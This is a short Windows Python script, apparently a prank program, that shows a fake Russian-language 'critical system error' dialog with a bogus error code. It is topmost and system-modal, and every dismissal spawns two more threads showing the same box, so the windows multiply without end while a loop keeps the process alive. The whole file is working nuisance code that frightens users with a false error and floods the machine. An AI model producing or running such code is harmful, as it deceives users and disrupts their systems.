import sys
import ctypes
import threading
import time

def show_sys_err():

    ctypes.windll.user32.MessageBoxW(0, "Произошла критическая ошибка. \nСистема может быть нестабильна.\n\nКод ошибки: 0xC0000005", "Ошибка",
                                     0x00000010 | 0x00001000 | 0x00040000 )

    threading.Thread(target=show_sys_err).start()
    threading.Thread(target=show_sys_err).start()

if __name__ == '__main__':
    threading.Thread(target=show_sys_err).start()
while True:
    time.sleep(1)